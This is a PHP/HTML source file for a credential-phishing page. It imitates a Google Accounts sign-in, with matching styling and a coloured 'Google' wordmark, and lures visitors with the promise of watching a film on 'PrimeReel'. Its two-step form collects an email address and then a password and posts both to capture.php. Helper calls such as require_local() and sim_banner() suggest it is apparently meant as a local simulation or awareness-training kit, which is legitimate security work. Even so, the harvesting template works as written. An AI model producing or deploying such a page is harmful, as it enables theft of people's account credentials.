<?php
require __DIR__ . '/lib.php';
require_local();
$title = isset($_GET['title']) ? substr($_GET['title'], 0, 120) : 'PrimeReel';
?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Sign in &ndash; Google Accounts</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124;min-height:100vh;
    display:flex;align-items:center;justify-content:center;padding:24px 16px 64px}
  .card{width:100%;max-width:448px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}
  .glogo{width:75px;height:24px;margin:0 auto 16px;display:block}
  .glogo text{font:700 21px Arial}
  h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px}
  .sub{text-align:center;font-size:16px;color:#202124;margin-bottom:6px}
  .sub b{font-weight:500}
  .movie{text-align:center;font-size:13px;color:#5f6368;margin-bottom:26px}
  .field{position:relative;margin:22px 0 4px}
  .field input{width:100%;height:56px;padding:0 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;outline:none}
  .field input:focus{border:2px solid #1a73e8;padding:0 14px}
  .field label{position:absolute;left:12px;top:17px;color:#5f6368;font-size:16px;background:#fff;padding:0 5px;
    transition:.15s;pointer-events:none}
  .field input:focus+label,.field input:not(:placeholder-shown)+label{top:-9px;font-size:12px;color:#1a73e8}
  .field input:not(:focus):not(:placeholder-shown)+label{color:#5f6368}
  .chip{display:inline-flex;align-items:center;gap:8px;border:1px solid #dadce0;border-radius:16px;padding:5px 12px 5px 8px;
    font-size:14px;margin:0 auto 6px;cursor:default}
  .chip .av{width:22px;height:22px;border-radius:50%;background:#1a73e8;color:#fff;display:grid;place-items:center;font-size:12px;font-weight:600}
  .center{display:flex;justify-content:center}
  .err{color:#d93025;font-size:12.5px;margin-top:6px;display:none}
  .help{font-size:14px;color:#1a73e8;font-weight:500;margin-top:30px;cursor:pointer}
  .row{display:flex;align-items:center;justify-content:space-between;margin-top:34px}
  .next{background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:14px;font-weight:600;
    padding:10px 24px;cursor:pointer}
  .next:hover{background:#1b66c9;box-shadow:0 1px 2px rgba(0,0,0,.2)}
  .foothint{max-width:448px;margin:18px auto 0;font-size:12px;color:#5f6368;display:flex;justify-content:space-between;padding:0 4px}
  .gn{display:none}
</style>
</head>
<body>
  <div>
    <div class="card">
      <!-- generic multi-colour wordmark (not Google's trademarked asset) -->
      <svg class="glogo" viewBox="0 0 75 24"><text x="0" y="19">
        <tspan fill="#4285F4">G</tspan><tspan fill="#EA4335">o</tspan><tspan fill="#FBBC05">o</tspan><tspan fill="#4285F4">g</tspan><tspan fill="#34A853">l</tspan><tspan fill="#EA4335">e</tspan>
      </text></svg>

      <form id="frm" method="post" action="capture.php">
        <input type="hidden" name="title" value="<?= e($title) ?>" />
        <input type="hidden" name="email" id="emailHidden" />
        <input type="hidden" name="password" id="passHidden" />

        <!-- Step 1: email -->
        <div id="step1">
          <h1>Sign in</h1>
          <div class="movie">to continue to <b><?= e('PrimeReel') ?></b> &middot; watch &ldquo;<?= e($title) ?>&rdquo;</div>
          <div class="field">
            <input type="text" id="email" placeholder=" " autocomplete="username" autofocus />
            <label>Email or phone</label>
            <div class="err" id="e1">Enter a valid email or phone number</div>
          </div>
          <div class="help">Forgot email?</div>
          <div class="row">
            <span style="font-size:14px;color:#1a73e8;font-weight:500;cursor:pointer">Create account</span>
            <button type="button" class="next" onclick="toStep2()">Next</button>
          </div>
        </div>

        <!-- Step 2: password -->
        <div id="step2" class="gn">
          <h1>Welcome</h1>
          <div class="center"><span class="chip"><span class="av" id="avi">@</span><span id="chipEmail">you@example.com</span></span></div>
          <div class="field" style="margin-top:24px">
            <input type="password" id="pass" placeholder=" " autocomplete="current-password" />
            <label>Enter your password</label>
            <div class="err" id="e2">Wrong password. Try again.</div>
          </div>
          <label style="display:flex;align-items:center;gap:9px;font-size:14px;margin-top:14px;cursor:pointer">
            <input type="checkbox" /> Show password</label>
          <div class="row">
            <span style="font-size:14px;color:#1a73e8;font-weight:500;cursor:pointer">Forgot password?</span>
            <button type="submit" class="next">Next</button>
          </div>
        </div>
      </form>
    </div>
    <div class="foothint"><span>English (United States)</span><span>Help &nbsp; Privacy &nbsp; Terms</span></div>
  </div>

  <script>
    var email=document.getElementById('email'), pass=document.getElementById('pass');
    function toStep2(){
      var v=email.value.trim();
      if(!v || (v.indexOf('@')<0 && !/^\+?[0-9 ]{6,}$/.test(v))){ document.getElementById('e1').style.display='block'; return; }
      document.getElementById('emailHidden').value=v;
      document.getElementById('chipEmail').textContent=v;
      document.getElementById('avi').textContent=(v[0]||'@').toUpperCase();
      document.getElementById('step1').classList.add('gn');
      document.getElementById('step2').classList.remove('gn');
      setTimeout(function(){ pass.focus(); },50);
    }
    document.querySelector('input[type=checkbox]').addEventListener('change',function(e){ pass.type=e.target.checked?'text':'password'; });
    document.getElementById('frm').addEventListener('submit',function(ev){
      if(!pass.value){ ev.preventDefault(); document.getElementById('e2').style.display='block'; return; }
      document.getElementById('passHidden').value=pass.value;
    });
  </script>
  <?= sim_banner() ?>
</body>
</html>
